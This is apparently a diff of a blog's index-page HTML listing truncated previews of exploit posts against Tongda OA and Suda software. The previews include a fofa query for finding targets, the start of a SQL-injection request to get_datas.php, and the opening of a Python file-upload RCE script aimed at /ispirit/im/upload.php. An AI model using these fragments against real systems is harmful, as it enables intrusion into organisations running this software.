@@ -38,7 +38,7 @@
             <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+            <div class="menu-inner"><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                             <i class="fas fa-search fa-fw" aria-hidden="true"></i>
@@ -81,7 +81,7 @@
                     <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                         Cancel
                     </a>
-                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                </div><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
@@ -91,7 +91,7 @@
     <div class="search-dropdown mobile">
         <div id="search-dropdown-mobile"></div>
     </div><main class="main">
-                <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-avatar"><a href="/posts/" title="文章"><img
+                <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-avatar"><a href="/tags/" title="标签"><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/image/cat.jpg"
@@ -107,6 +107,12 @@
 <a href="/index.xml" title="RSS" target="_blank" rel="noopener noreffer me"><i class="fas fa-rss fa-fw" aria-hidden="true"></i></a>
 </div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">通达OA get_datas.php前台sql注入</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div><div class="content">通达OA get_datas.php前台sql注入 fofa 1 app=&#34;TDXK-通达OA&#34; POC 1 2 3 4 5 6 7 POST /general/reportshop/utils/get_datas.php HTTP/1.1 Host: {{HostName}} Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 10.0;</div><div class="post-footer">
+        <a href="/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/">通达OA ispiritinterfacegateway.php文件包含rce</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">``` #!/usr/bin/env python3 -- encoding: utf-8 -- #https://mp.weixin.qq.com/s/K922zfgJpevXXBx1tWR8Ow &rsquo;&rsquo;&rsquo; @File : Tongda_rce.py @Time : 2020/03/19 12:00:00 @Author : Al1ex @Github : https://github.com/Al1ex &rsquo;'' import requests import re import sys def check(url): try: upload_url = url + '/ispirit/im/upload.php' flag=&quot;nt authority\system&quot;; headers = { &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot; } payload ='''------WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data;</div><div class="post-footer">
@@ -136,12 +142,6 @@
 </span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">## **影响版本:2017版/v11.0-v11.6** 修改目标IP与Cookie中PHPSESSID的值(SQL注入获取到的SID) 1 2 3 4</div><div class="post-footer">
         <a href="/%E9%80%9A%E8%BE%BEoa%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0generaldata_centerutilsupload.php-2017%E7%89%88v11.0-v11.6/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">速达软件全系产品存在任意文件上传漏洞</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div><div class="content">速达软件全系产品存在任意文件上传漏洞 速达软件专注中小企业管理软件,产品涵盖进销存软件,财务软件,ERP软件,CRM系统,项目管理软件,OA系</div><div class="post-footer">
-        <a href="/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
